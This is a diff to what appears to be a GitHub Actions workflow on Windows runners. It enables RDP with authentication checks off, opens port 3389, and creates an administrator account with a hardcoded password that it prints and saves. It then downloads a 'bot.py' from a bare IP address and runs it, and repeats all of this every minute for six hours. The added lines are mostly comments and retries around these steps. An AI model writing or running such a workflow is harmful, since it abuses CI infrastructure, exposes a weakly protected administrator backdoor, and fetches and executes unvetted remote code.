@@ -57,23 +57,38 @@ jobs:
       - name: Enable RDP and Create User
         shell: pwsh
         run: |
+          # Enable RDP
           Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -Value 0 -Force
           Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name "UserAuthentication" -Value 0 -Force
+          
+          # Configure Firewall
           netsh advfirewall firewall delete rule name="RDP" 2>$null
           netsh advfirewall firewall add rule name="RDP" dir=in action=allow protocol=TCP localport=3389
+          
+          # Restart RDP Service
           Restart-Service TermService -Force
+          
+          # Create User (without -Force parameter for compatibility)
           $password = ConvertTo-SecureString "admin@123" -AsPlainText -Force
+          
+          # Remove user if exists (compatible method without -Force)
           if (Get-LocalUser -Name "TOOLBOXLAP" -ErrorAction SilentlyContinue) {
-              Remove-LocalUser -Name "TOOLBOXLAP" -Force
+              Remove-LocalUser -Name "TOOLBOXLAP"
           }
+          
+          # Create new user
           New-LocalUser -Name "TOOLBOXLAP" -Password $password -AccountNeverExpires -PasswordNeverExpires
           Add-LocalGroupMember -Group "Administrators" -Member "TOOLBOXLAP"
           Add-LocalGroupMember -Group "Remote Desktop Users" -Member "TOOLBOXLAP"
+          
+          # Get IP Address
           try {
               $ip = (Invoke-WebRequest -Uri "https://api.ipify.org" -UseBasicParsing -TimeoutSec 10).Content.Trim()
           } catch {
               $ip = (Invoke-WebRequest -Uri "https://icanhazip.com" -UseBasicParsing -TimeoutSec 10).Content.Trim()
           }
+          
+          # Display Connection Info
           Write-Host ""
           Write-Host "============================================"
           Write-Host "RDP CONNECTION INFO"
@@ -85,6 +100,8 @@ jobs:
           Write-Host "Username      : TOOLBOXLAP"
           Write-Host "Password      : admin@123"
           Write-Host "============================================"
+          
+          # Save to file
           $desktop = [Environment]::GetFolderPath("Desktop")
           $infoFile = "$desktop\RDP_INFO_SERVER_${{ matrix.server }}.txt"
           "IP: $ip`nUser: TOOLBOXLAP`nPass: admin@123" | Out-File -FilePath $infoFile
@@ -94,14 +111,19 @@ jobs:
         run: |
           $desktop = [Environment]::GetFolderPath("Desktop")
           $botUrl = "http://82.47.102.153:5000"
+          
+          # Download bot with retry
           for ($i = 1; $i -le 3; $i++) {
               try {
                   Invoke-WebRequest -Uri $botUrl -OutFile "$desktop\bot.py" -UseBasicParsing -TimeoutSec 30
                   break
               } catch {
+                  Write-Host "Download attempt $i failed, retrying..."
                   Start-Sleep -Seconds 5
               }
           }
+          
+          # Find or install Python
           $pythonPath = (Get-Command python -ErrorAction SilentlyContinue).Source
           if (-not $pythonPath) {
               $installer = "$env:TEMP\python.exe"
@@ -111,17 +133,20 @@ jobs:
               Start-Sleep -Seconds 10
               $pythonPath = "C:\Python311\python.exe"
           }
+          
+          # Run bot
           if (Test-Path "$desktop\bot.py") {
               Start-Process -FilePath $pythonPath -ArgumentList "`"$desktop\bot.py`"" -WindowStyle Normal
+              Write-Host "Bot started successfully"
           }
 
-      - name: Rotate Servers Every Minute (Kill Current, Start New)
+      - name: Rotate Servers Every Minute
         shell: pwsh
         run: |
           $endTime = (Get-Date).AddHours(6)
           $serverNum = ${{ matrix.server }}
-          $os = "${{ matrix.os }}"
           $desktop = [Environment]::GetFolderPath("Desktop")
+          $botUrl = "http://82.47.102.153:5000"
           
           Write-Host ""
           Write-Host "===== ROTATION MODE ENABLED ====="
@@ -145,62 +170,72 @@ jobs:
               
               Write-Host "[$(Get-Date)] ROTATING: Killing current RDP session on Server $serverNum..."
               
-              # Kill RDP service to disconnect all sessions
-              Stop-Service TermService -Force -ErrorAction SilentlyContinue
-              
-              # Kill any running bot processes
-              Get-Process -Name "python" -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
-              
-              # Clear RDP settings
-              Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -Value 0 -Force
-              
-              # Reset firewall
-              netsh advfirewall firewall delete rule name="RDP" 2>$null
-              netsh advfirewall firewall add rule name="RDP" dir=in action=allow protocol=TCP localport=3389
-              
-              # Restart RDP with new session
-              Restart-Service TermService -Force -ErrorAction SilentlyContinue
-              
-              # Recreate user (force refresh)
-              $password = ConvertTo-SecureString "admin@123" -AsPlainText -Force
-              if (Get-LocalUser -Name "TOOLBOXLAP" -ErrorAction SilentlyContinue) {
-                  Remove-LocalUser -Name "TOOLBOXLAP" -Force
-              }
-              New-LocalUser -Name "TOOLBOXLAP" -Password $password -AccountNeverExpires -PasswordNeverExpires
-              Add-LocalGroupMember -Group "Administrators" -Member "TOOLBOXLAP" -ErrorAction SilentlyContinue
-              Add-LocalGroupMember -Group "Remote Desktop Users" -Member "TOOLBOXLAP" -ErrorAction SilentlyContinue
-              
-              # Redownload and run bot
-              $botUrl = "http://82.47.102.153:5000"
+              # Disconnect all RDP sessions
               try {
-                  Invoke-WebRequest -Uri $botUrl -OutFile "$desktop\bot.py" -UseBasicParsing -TimeoutSec 30 -ErrorAction Stop
+                  # Kill RDP service
+                  Stop-Service TermService -Force -ErrorAction SilentlyContinue
+                  
+                  # Kill any running bot processes
+                  Get-Process -Name "python" -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
+                  Get-Process -Name "python3" -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
+                  
+                  # Clear RDP settings and reset
+                  Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -Value 0 -Force
+                  
+                  # Reset firewall rules
+                  netsh advfirewall firewall delete rule name="RDP" 2>$null
+                  netsh advfirewall firewall add rule name="RDP" dir=in action=allow protocol=TCP localport=3389
+                  
+                  # Restart RDP service
+                  Restart-Service TermService -Force -ErrorAction SilentlyContinue
+                  
+                  # Recreate user (compatible method without -Force)
+                  $password = ConvertTo-SecureString "admin@123" -AsPlainText -Force
+                  if (Get-LocalUser -Name "TOOLBOXLAP" -ErrorAction SilentlyContinue) {
+                      Remove-LocalUser -Name "TOOLBOXLAP"
+                  }
+                  New-LocalUser -Name "TOOLBOXLAP" -Password $password -AccountNeverExpires -PasswordNeverExpires
+                  Add-LocalGroupMember -Group "Administrators" -Member "TOOLBOXLAP" -ErrorAction SilentlyContinue
+                  Add-LocalGroupMember -Group "Remote Desktop Users" -Member "TOOLBOXLAP" -ErrorAction SilentlyContinue
+                  
+                  # Redownload bot
+                  try {
+                      Invoke-WebRequest -Uri $botUrl -OutFile "$desktop\bot.py" -UseBasicParsing -TimeoutSec 30 -ErrorAction Stop
+                      Write-Host "[$(Get-Date)] Bot downloaded successfully"
+                  } catch {
+                      Write-Host "[$(Get-Date)] Failed to download fresh bot: $_"
+                  }
+                  
+                  # Restart bot
+                  $pythonPath = (Get-Command python -ErrorAction SilentlyContinue).Source
+                  if (-not $pythonPath) {
+                      $pythonPath = "C:\Python311\python.exe"
+                  }
+                  if (Test-Path "$desktop\bot.py") {
+                      Start-Process -FilePath $pythonPath -ArgumentList "`"$desktop\bot.py`"" -WindowStyle Normal
+                      Write-Host "[$(Get-Date)] Bot restarted with fresh copy"
+                  }
+                  
+                  # Get new IP after rotation
+                  Start-Sleep -Seconds 5
+                  try {
+                      $newIp = (Invoke-WebRequest -Uri "https://api.ipify.org" -UseBasicParsing -TimeoutSec 10).Content.Trim()
+                  } catch {
+                      $newIp = (Invoke-WebRequest -Uri "https://icanhazip.com" -UseBasicParsing -TimeoutSec 10).Content.Trim()
+                  }
+                  
+                  Write-Host "[$(Get-Date)] ROTATION COMPLETE - New IP: $newIp"
+                  Write-Host "============================================"
+                  
+                  $remaining = [math]::Round(($endTime - (Get-Date)).TotalMinutes, 0)
+                  Write-Host "[$(Get-Date)] Server $serverNum - $remaining minutes remaining until 6-hour limit"
+                  Write-Host ""
+                  
               } catch {
-                  Write-Host "[$(Get-Date)] Failed to download fresh bot"
+                  Write-Host "[$(Get-Date)] ERROR during rotation: $_"
+                  Write-Host "[$(Get-Date)] Attempting to recover..."
+                  Start-Sleep -Seconds 10
               }
-              
-              $pythonPath = (Get-Command python -ErrorAction SilentlyContinue).Source
-              if (-not $pythonPath) {
-                  $pythonPath = "C:\Python311\python.exe"
-              }
-              if (Test-Path "$desktop\bot.py") {
-                  Start-Process -FilePath $pythonPath -ArgumentList "`"$desktop\bot.py`"" -WindowStyle Normal
-                  Write-Host "[$(Get-Date)] Bot restarted with fresh copy"
-              }
-              
-              # Get new IP after rotation
-              Start-Sleep -Seconds 5
-              try {
-                  $newIp = (Invoke-WebRequest -Uri "https://api.ipify.org" -UseBasicParsing -TimeoutSec 10).Content.Trim()
-              } catch {
-                  $newIp = (Invoke-WebRequest -Uri "https://icanhazip.com" -UseBasicParsing -TimeoutSec 10).Content.Trim()
-              }
-              
-              Write-Host "[$(Get-Date)] ROTATION COMPLETE - New IP: $newIp"
-              Write-Host "============================================"
-              
-              $remaining = [math]::Round(($endTime - (Get-Date)).TotalMinutes, 0)
-              Write-Host "[$(Get-Date)] Server $serverNum - $remaining minutes remaining until 6-hour limit"
-              Write-Host ""
           }
           
           Write-Host ""
